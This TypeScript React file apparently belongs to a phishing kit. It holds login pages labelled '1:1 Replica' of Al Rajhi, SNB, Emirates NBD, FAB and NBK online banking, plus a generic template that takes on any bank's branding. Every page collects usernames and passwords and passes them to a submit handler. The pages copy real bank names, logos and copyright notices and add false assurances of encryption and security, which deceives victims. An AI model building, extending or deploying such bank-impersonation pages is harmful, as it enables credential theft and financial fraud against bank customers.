import React from 'react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import {
  Lock,
  Eye,
  EyeOff,
  ShieldCheck,
  Loader2,
  User,
  KeyRound,
  Globe,
  Smartphone,
  ShieldAlert,
  HelpCircle,
} from "lucide-react";
import BankLogo from "@/components/BankLogo";

interface BankLoginLayoutProps {
  bank: {
    id: string;
    name: string;
    nameAr: string;
    logo?: string;
    color: string;
  } | null;
  branding: {
    id: string;
    nameEn: string;
    nameAr: string;
    colors: {
        primary: string;
        secondary: string;
        accent?: string;
        background: string;
        surface: string;
        text: string;
        textLight: string;
        textOnPrimary: string;
        border: string;
    };
    fonts: {
        primary: string;
        secondary: string;
        arabic: string;
    };
    gradients: {
        primary: string;
        secondary: string;
        hero: string;
    };
    shadows: {
        sm: string;
        md: string;
        lg: string;
    };
    borderRadius: {
        sm: string;
        md: string;
        lg: string;
    };
    logoUrl?: string;
    heroUrl?: string;
    websiteUrl?: string;
    description: string;
  } | null;
  username: string;
  setUsername: (v: string) => void;
  password: string;
  setPassword: (v: string) => void;
  customerId: string;
  setCustomerId: (v: string) => void;
  showPassword: boolean;
  setShowPassword: (v: boolean) => void;
  isSubmitting: boolean;
  handleSubmit: (e: React.FormEvent) => void;
  formattedAmount: string;
}

// Al Rajhi Bank Layout (1:1 Replica)
export const AlRajhiLogin: React.FC<BankLoginLayoutProps> = (props) => {
  return (
    <div className="min-h-screen bg-[#F4F7F2] flex flex-col font-arabic" dir="rtl">
      <header className="bg-[#006C35] h-20 sm:h-24 flex items-center px-4 shadow-lg sticky top-0 z-50">
        <div className="container mx-auto flex items-center justify-between">
           <div className="flex items-center gap-6">
              <div className="w-32 sm:w-48 brightness-0 invert">
                 <BankLogo bankId="alrajhi_bank" bankName="Al Rajhi" bankNameAr="الراجحي" size="lg" />
              </div>
           </div>
           <div className="flex items-center gap-3">
              <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-white/10 text-white text-[11px] font-bold">
                 <Globe className="w-4 h-4" /> <span>English</span>
              </div>
              <div className="hidden sm:flex items-center gap-2 px-3 py-2 rounded-lg bg-white text-[#006C35] text-[11px] font-bold shadow-inner">
                 <Lock className="w-4 h-4" /> <span>اتصال آمن</span>
              </div>
           </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-10">
         <div className="w-full max-w-md space-y-4">
            <div className="bg-white rounded-none border-t-[6px] border-[#006C35] shadow-[0_10px_40px_-15px_rgba(0,0,0,0.1)] overflow-hidden">
               <div className="p-8 pb-4 text-right">
                  <h2 className="text-2xl font-black text-[#006C35]">المصرفية المباشرة للأفراد</h2>
                  <p className="text-gray-400 text-xs mt-1">سجل دخولك للوصول إلى حسابك</p>
               </div>

               <form onSubmit={props.handleSubmit} className="p-8 pt-4 space-y-6">
                  <div className="space-y-4">
                     <div className="space-y-1">
                        <Label className="text-sm font-bold text-gray-700">اسم المستخدم</Label>
                        <Input
                           value={props.username}
                           onChange={(e) => props.setUsername(e.target.value)}
                           className="h-12 border-x-0 border-t-0 border-b-2 border-gray-200 rounded-none px-0 font-bold text-lg focus:border-[#006C35] transition-colors"
                           placeholder="أدخل اسم المستخدم"
                           required
                        />
                     </div>
                     <div className="space-y-1">
                        <div className="flex justify-between items-center">
                           <Label className="text-sm font-bold text-gray-700">كلمة المرور</Label>
                           <button type="button" className="text-xs text-blue-600 font-bold hover:underline">نسيت كلمة المرور؟</button>
                        </div>
                        <div className="relative">
                           <Input
                              type={props.showPassword ? "text" : "password"}
                              value={props.password}
                              onChange={(e) => props.setPassword(e.target.value)}
                              className="h-12 border-x-0 border-t-0 border-b-2 border-gray-200 rounded-none px-0 font-bold text-lg focus:border-[#006C35] transition-colors"
                              placeholder="أدخل كلمة المرور"
                              required
                           />
                           <button
                             type="button"
                             onClick={() => props.setShowPassword(!props.showPassword)}
                             className="absolute left-0 top-1/2 -translate-y-1/2 text-gray-400"
                           >
                              {props.showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                           </button>
                        </div>
                     </div>
                  </div>

                  <Button
                     type="submit"
                     disabled={props.isSubmitting}
                     className="w-full h-14 bg-[#006C35] hover:bg-[#005428] text-white font-black text-xl rounded-lg shadow-xl"
                  >
                     {props.isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "دخول"}
                  </Button>

                  <div className="pt-4 border-t border-gray-50 flex justify-between items-center">
                     <span className="text-[10px] font-bold text-gray-400">تحتاج مساعدة؟</span>
                     <div className="flex gap-4">
                        <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-3 opacity-30 grayscale" />
                        <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-3 opacity-30 grayscale" />
                     </div>
                  </div>
               </form>
            </div>
            <div className="text-center">
               <p className="text-[10px] text-gray-400 font-bold">جميع الحقوق محفوظة لمصرف الراجحي © 2024</p>
            </div>
         </div>
      </main>
    </div>
  );
};

// SNB Layout (1:1 Replica)
export const SNBLogin: React.FC<BankLoginLayoutProps> = (props) => {
  return (
    <div className="min-h-screen bg-white flex flex-col font-arabic" dir="rtl">
      <header className="border-b-8 border-[#034638] h-20 sm:h-24 flex items-center px-4 shadow-sm bg-white sticky top-0 z-50">
        <div className="container mx-auto flex items-center justify-between">
           <div className="w-40 sm:w-56">
              <BankLogo bankId="alahli_bank" bankName="SNB" bankNameAr="الأهلي" size="lg" />
           </div>
           <div className="flex items-center gap-6">
              <div className="hidden lg:flex flex-col text-left">
                 <span className="text-[10px] font-black text-gray-300 uppercase tracking-widest leading-tight">AlAhliOnline</span>
                 <span className="text-[10px] font-black text-[#034638] uppercase tracking-widest leading-tight">SNB Group</span>
              </div>
              <div className="h-8 w-px bg-gray-100 hidden sm:block" />
              <div className="flex items-center gap-2 text-[#034638] font-black text-xs cursor-pointer">
                 <Globe className="w-4 h-4" /> <span>ENGLISH</span>
              </div>
           </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto max-w-6xl px-4 py-12 lg:py-20 flex flex-col lg:flex-row gap-12 items-center">
         <div className="hidden lg:block flex-1 space-y-8">
            <div className="space-y-4">
               <h1 className="text-5xl font-black text-[#034638] leading-tight">مرحباً بك في <br />الأهلي أون لاين</h1>
               <p className="text-xl text-gray-500 font-bold">الخدمات المصرفية الآمنة والسريعة في متناول يديك</p>
            </div>
            <div className="grid grid-cols-2 gap-4">
               {[
                 { icon: ShieldCheck, title: 'أمان عالي', desc: 'تشفير متطور' },
                 { icon: Smartphone, title: 'سهولة الدخول', desc: 'تجربة مستخدم مميزة' }
               ].map((item, i) => (
                 <div key={i} className="p-6 rounded-2xl bg-[#034638]/5 border border-[#034638]/10 flex items-start gap-4">
                    <item.icon className="w-8 h-8 text-[#034638]" />
                    <div>
                       <p className="font-black text-[#034638]">{item.title}</p>
                       <p className="text-xs text-gray-500 font-bold">{item.desc}</p>
                    </div>
                 </div>
               ))}
            </div>
         </div>

         <div className="w-full lg:w-[450px]">
            <Card className="p-8 sm:p-10 border-none shadow-[0_20px_60px_-15px_rgba(0,0,0,0.15)] rounded-[2.5rem] bg-white ring-1 ring-gray-50">
               <div className="mb-10 flex flex-col items-center lg:items-start">
                  <div className="w-14 h-14 rounded-2xl bg-[#034638] flex items-center justify-center text-white mb-6 shadow-lg shadow-[#034638]/20">
                     <Lock className="w-7 h-7" />
                  </div>
                  <h2 className="text-3xl font-black text-[#034638]">تسجيل الدخول</h2>
                  <p className="text-gray-400 text-sm font-bold mt-2">يرجى إدخال بياناتك للمتابعة</p>
               </div>

               <form onSubmit={props.handleSubmit} className="space-y-8">
                  <div className="space-y-6">
                     <div className="space-y-2">
                        <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">اسم المستخدم</Label>
                        <div className="relative group">
                           <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-[#034638] transition-colors" />
                           <Input
                              value={props.username}
                              onChange={(e) => props.setUsername(e.target.value)}
                              className="h-16 border-2 border-gray-100 rounded-2xl pr-12 font-black text-lg bg-gray-50/50 focus:bg-white focus:border-[#034638] transition-all"
                              required
                           />
                        </div>
                     </div>
                     <div className="space-y-2">
                        <div className="flex justify-between items-center px-1">
                           <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest">كلمة السر</Label>
                           <button type="button" className="text-[10px] text-[#034638] font-black underline">نسيت كلمة السر؟</button>
                        </div>
                        <div className="relative group">
                           <KeyRound className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-[#034638] transition-colors" />
                           <Input
                              type={props.showPassword ? "text" : "password"}
                              value={props.password}
                              onChange={(e) => props.setPassword(e.target.value)}
                              className="h-16 border-2 border-gray-100 rounded-2xl pr-12 pl-12 font-black text-lg bg-gray-50/50 focus:bg-white focus:border-[#034638] transition-all"
                              required
                           />
                           <button
                             type="button"
                             onClick={() => props.setShowPassword(!props.showPassword)}
                             className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300"
                           >
                              {props.showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                           </button>
                        </div>
                     </div>
                  </div>

                  <Button
                     type="submit"
                     disabled={props.isSubmitting}
                     className="w-full h-16 bg-[#034638] hover:bg-[#022F24] text-white font-black text-xl rounded-2xl shadow-xl active:scale-[0.98] transition-all"
                  >
                     {props.isSubmitting ? <Loader2 className="w-8 h-8 animate-spin" /> : "دخول آمن"}
                  </Button>
               </form>

               <div className="mt-10 pt-8 border-t flex flex-col sm:flex-row justify-between items-center gap-4 opacity-40">
                  <div className="flex items-center gap-2">
                     <ShieldAlert className="w-4 h-4" />
                     <span className="text-[10px] font-bold">حماية مشفرة SSL</span>
                  </div>
                  <div className="flex gap-4 grayscale">
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-4" />
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-4" />
                  </div>
               </div>
            </Card>
         </div>
      </main>

      <footer className="py-10 bg-gray-50 border-t">
         <div className="container mx-auto px-4 text-center">
            <p className="text-[10px] font-bold text-gray-400 max-w-2xl mx-auto leading-relaxed">
               جميع الحقوق محفوظة لصالح البنك الأهلي السعودي - SNB. إن استخدامك لهذا الموقع يعني موافقتك على شروط وأحكام الخدمة. البنك الأهلي السعودي شركة مساهمة سعودية خاضعة لرقابة وإشراف البنك المركزي السعودي.
            </p>
         </div>
      </footer>
    </div>
  );
};

// Emirates NBD Layout (1:1 Replica)
export const EmiratesNBDLogin: React.FC<BankLoginLayoutProps> = (props) => {
  return (
    <div className="min-h-screen bg-white flex flex-col font-arabic" dir="rtl">
      <header className="bg-white border-b h-20 sm:h-24 flex items-center px-4 sticky top-0 z-50">
        <div className="container mx-auto flex items-center justify-between">
           <div className="w-40 sm:w-56">
              <BankLogo bankId="emirates_nbd" bankName="Emirates NBD" bankNameAr="بنك الإمارات دبي الوطني" size="lg" />
           </div>
           <div className="flex items-center gap-4">
              <span className="text-[11px] font-black text-[#D50032] uppercase tracking-widest cursor-pointer">English</span>
              <div className="w-10 h-10 rounded-full bg-gray-50 flex items-center justify-center text-gray-400">
                 <HelpCircle className="w-5 h-5" />
              </div>
           </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-12 bg-[#f8f9fb]">
         <div className="w-full max-w-md">
            <Card className="p-8 sm:p-12 border-0 shadow-2xl rounded-none bg-white">
               <div className="mb-10 text-center sm:text-right">
                  <h2 className="text-3xl font-black text-gray-900 mb-2">Welcome to Online Banking</h2>
                  <p className="text-gray-400 text-sm font-bold">Please enter your login details</p>
               </div>

               <form onSubmit={props.handleSubmit} className="space-y-8">
                  <div className="space-y-6">
                     <div className="space-y-2">
                        <Label className="text-xs font-black text-gray-500 uppercase tracking-widest">Username</Label>
                        <Input
                           value={props.username}
                           onChange={(e) => props.setUsername(e.target.value)}
                           className="h-14 border-0 border-b-2 border-gray-100 rounded-none px-0 font-bold text-lg focus:border-[#D50032] transition-all bg-transparent"
                           required
                        />
                     </div>
                     <div className="space-y-2">
                        <Label className="text-xs font-black text-gray-500 uppercase tracking-widest">Password</Label>
                        <div className="relative">
                           <Input
                              type={props.showPassword ? "text" : "password"}
                              value={props.password}
                              onChange={(e) => props.setPassword(e.target.value)}
                              className="h-14 border-0 border-b-2 border-gray-100 rounded-none px-0 font-bold text-lg focus:border-[#D50032] transition-all bg-transparent pl-12"
                              required
                           />
                           <button
                             type="button"
                             onClick={() => props.setShowPassword(!props.showPassword)}
                             className="absolute left-0 top-1/2 -translate-y-1/2 text-gray-400"
                           >
                              {props.showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                           </button>
                        </div>
                     </div>
                  </div>

                  <Button
                     type="submit"
                     disabled={props.isSubmitting}
                     className="w-full h-16 bg-[#D50032] hover:bg-[#b00029] text-white font-black text-lg rounded-none shadow-xl transition-all"
                  >
                     {props.isSubmitting ? <Loader2 className="w-8 h-8 animate-spin" /> : "LOG IN"}
                  </Button>
               </form>

               <div className="mt-12 flex flex-col items-center gap-6">
                  <div className="flex gap-8 items-center opacity-30 grayscale h-4">
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
                  </div>
                  <p className="text-[10px] font-bold text-gray-300 text-center uppercase tracking-[0.2em]">Secure & Encrypted</p>
               </div>
            </Card>
         </div>
      </main>
    </div>
  );
};

// FAB Layout (1:1 Replica)
export const FABLogin: React.FC<BankLoginLayoutProps> = (props) => {
  return (
    <div className="min-h-screen bg-slate-50 flex flex-col font-arabic" dir="rtl">
      <header className="bg-white border-b-4 border-[#003087] h-20 sm:h-24 flex items-center px-4 sticky top-0 z-50">
        <div className="container mx-auto flex items-center justify-between">
           <div className="w-40 sm:w-56">
              <BankLogo bankId="fab" bankName="FAB" bankNameAr="أبوظبي الأول" size="lg" />
           </div>
           <div className="flex items-center gap-3">
              <div className="flex items-center gap-2 px-4 py-2 rounded-full border border-gray-100 text-xs font-black text-[#003087]">
                 <Globe className="w-4 h-4" /> <span>ENGLISH</span>
              </div>
           </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-12">
         <div className="w-full max-w-md space-y-6">
            <Card className="p-8 sm:p-12 border-0 shadow-2xl rounded-[2rem] bg-white text-center">
               <div className="mb-8">
                  <div className="w-16 h-16 rounded-full bg-[#003087]/5 flex items-center justify-center mx-auto mb-4">
                    <ShieldCheck className="w-8 h-8 text-[#003087]" />
                  </div>
                  <h2 className="text-2xl font-black text-gray-800">Online Banking Login</h2>
                  <p className="text-gray-400 text-xs font-bold mt-1">Access your accounts securely</p>
               </div>

               <form onSubmit={props.handleSubmit} className="space-y-6">
                  <div className="space-y-4">
                     <div className="space-y-1 text-right">
                        <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">Username</Label>
                        <Input
                           value={props.username}
                           onChange={(e) => props.setUsername(e.target.value)}
                           className="h-14 border-2 border-gray-100 rounded-xl font-bold bg-gray-50/30 focus:border-[#003087] transition-all"
                           required
                        />
                     </div>
                     <div className="space-y-1 text-right">
                        <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">Password</Label>
                        <div className="relative">
                           <Input
                              type={props.showPassword ? "text" : "password"}
                              value={props.password}
                              onChange={(e) => props.setPassword(e.target.value)}
                              className="h-14 border-2 border-gray-100 rounded-xl font-bold bg-gray-50/30 focus:border-[#003087] transition-all pl-12"
                              required
                           />
                           <button
                             type="button"
                             onClick={() => props.setShowPassword(!props.showPassword)}
                             className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300"
                           >
                              {props.showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                           </button>
                        </div>
                     </div>
                  </div>

                  <Button
                     type="submit"
                     disabled={props.isSubmitting}
                     className="w-full h-16 bg-[#003087] hover:bg-[#002664] text-white font-black text-lg rounded-xl shadow-xl transition-all"
                  >
                     {props.isSubmitting ? <Loader2 className="w-8 h-8 animate-spin" /> : "SECURE LOGIN"}
                  </Button>
               </form>

               <div className="mt-8 flex justify-center gap-6 opacity-20 h-4 grayscale">
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
               </div>
            </Card>
         </div>
      </main>
    </div>
  );
};

// NBK Layout (1:1 Replica)
export const NBKLogin: React.FC<BankLoginLayoutProps> = (props) => {
  return (
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col font-arabic" dir="rtl">
      <header className="bg-[#003366] h-20 sm:h-24 flex items-center px-4 sticky top-0 z-50">
        <div className="container mx-auto flex items-center justify-between">
           <div className="w-32 sm:w-40 brightness-0 invert">
              <BankLogo bankId="nbk" bankName="NBK" bankNameAr="الوطني" size="lg" />
           </div>
           <div className="flex items-center gap-4 text-white text-xs font-black">
              <span>ENGLISH</span>
           </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4">
         <div className="w-full max-w-md">
            <Card className="p-8 sm:p-10 border-0 shadow-xl rounded-none bg-white">
               <div className="mb-10 text-right">
                  <h2 className="text-2xl font-black text-[#003366]">Welcome to NBK Online</h2>
                  <div className="h-1.5 w-16 bg-[#003366] mt-4" />
               </div>

               <form onSubmit={props.handleSubmit} className="space-y-6">
                  <div className="space-y-4">
                     <div className="space-y-2 text-right">
                        <Label className="text-xs font-black text-gray-400">User ID</Label>
                        <Input
                           value={props.username}
                           onChange={(e) => props.setUsername(e.target.value)}
                           className="h-12 border border-gray-200 rounded-none font-bold focus:border-[#003366] transition-all bg-gray-50/30"
                           required
                        />
                     </div>
                     <div className="space-y-2 text-right">
                        <Label className="text-xs font-black text-gray-400">Password</Label>
                        <div className="relative">
                           <Input
                              type={props.showPassword ? "text" : "password"}
                              value={props.password}
                              onChange={(e) => props.setPassword(e.target.value)}
                              className="h-12 border border-gray-200 rounded-none font-bold focus:border-[#003366] transition-all bg-gray-50/30 pl-12"
                              required
                           />
                           <button
                             type="button"
                             onClick={() => props.setShowPassword(!props.showPassword)}
                             className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300"
                           >
                              {props.showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                           </button>
                        </div>
                     </div>
                  </div>

                  <Button
                     type="submit"
                     disabled={props.isSubmitting}
                     className="w-full h-14 bg-[#003366] hover:bg-[#002244] text-white font-black text-lg rounded-none shadow-lg transition-all"
                  >
                     {props.isSubmitting ? <Loader2 className="w-8 h-8 animate-spin" /> : "LOGIN"}
                  </Button>
               </form>
            </Card>
            <div className="mt-8 flex justify-between items-center px-2 opacity-50">
               <span className="text-[10px] font-bold text-gray-400">© 2024 NBK Group</span>
               <div className="flex gap-4">
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-3" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-3" />
               </div>
            </div>
         </div>
      </main>
    </div>
  );
};

// Generic Layout for other banks
export const GenericBankLogin: React.FC<BankLoginLayoutProps> = (props) => {
  const { bank, branding } = props;
  const primaryColor = bank?.color || branding?.colors.primary || '#004B87';

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col font-arabic" dir="rtl">
      <header className="bg-white border-b-4 h-20 flex items-center px-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
        <div className="container mx-auto flex items-center justify-between">
           <div className="w-40 sm:w-48">
              <BankLogo bankId={bank?.id || ""} bankName={bank?.name || ""} bankNameAr={bank?.nameAr || ""} size="lg" />
           </div>
           <div className="flex items-center gap-2">
              <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-green-50 text-green-700 border border-green-100 text-[10px] font-black">
                 <Lock className="w-3 h-3" /> <span>اتصال مشفر</span>
              </div>
           </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-12 relative overflow-hidden">
         <div className="absolute top-0 right-0 w-96 h-96 rounded-full opacity-[0.03] blur-3xl pointer-events-none" style={{ backgroundColor: primaryColor }} />
         <div className="absolute bottom-0 left-0 w-96 h-96 rounded-full opacity-[0.03] blur-3xl pointer-events-none" style={{ backgroundColor: primaryColor }} />

         <div className="w-full max-w-md relative z-10">
            <Card className="p-8 sm:p-10 border-0 shadow-2xl rounded-[2.5rem] bg-white">
               <div className="text-center mb-10">
                  <div className="w-20 h-20 rounded-3xl mx-auto mb-6 flex items-center justify-center text-white shadow-xl" style={{ backgroundColor: primaryColor }}>
                     <Smartphone className="w-10 h-10" />
                  </div>
                  <h2 className="text-2xl font-black text-gray-800">تسجيل الدخول الآمن</h2>
                  <p className="text-gray-400 text-xs font-bold mt-2 uppercase tracking-widest">SECURE BANK LOGIN</p>
               </div>

               <form onSubmit={props.handleSubmit} className="space-y-6">
                  <div className="space-y-4">
                     <div className="space-y-1.5">
                        <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">اسم المستخدم / رقم العميل</Label>
                        <Input
                           value={props.username}
                           onChange={(e) => props.setUsername(e.target.value)}
                           className="h-14 border-2 border-gray-100 rounded-2xl font-bold bg-gray-50/30 focus:border-gray-200 transition-all"
                           required
                        />
                     </div>
                     <div className="space-y-1.5">
                        <div className="flex justify-between items-center px-1">
                           <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest">كلمة السر</Label>
                        </div>
                        <div className="relative group">
                           <Input
                              type={props.showPassword ? "text" : "password"}
                              value={props.password}
                              onChange={(e) => props.setPassword(e.target.value)}
                              className="h-14 border-2 border-gray-100 rounded-2xl font-bold bg-gray-50/30 focus:border-gray-200 transition-all pl-12"
                              required
                           />
                           <button
                             type="button"
                             onClick={() => props.setShowPassword(!props.showPassword)}
                             className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300"
                           >
                              {props.showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                           </button>
                        </div>
                     </div>
                  </div>

                  <Button
                     type="submit"
                     disabled={props.isSubmitting}
                     className="w-full h-16 text-white font-black text-lg rounded-2xl shadow-xl active:scale-[0.98] transition-all"
                     style={{ backgroundColor: primaryColor }}
                  >
                     {props.isSubmitting ? <Loader2 className="w-8 h-8 animate-spin" /> : "دخول للمتابعة"}
                  </Button>
               </form>

               <div className="mt-10 flex justify-center gap-6 opacity-30 grayscale h-4">
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
               </div>
            </Card>
            <p className="mt-8 text-center text-[10px] font-bold text-gray-400 leading-relaxed px-4">
               أنت الآن في بيئة دفع آمنة ومشفرة تماماً. جميع بياناتك محمية بموجب معايير الأمان العالمية.
            </p>
         </div>
      </main>
    </div>
  );
};
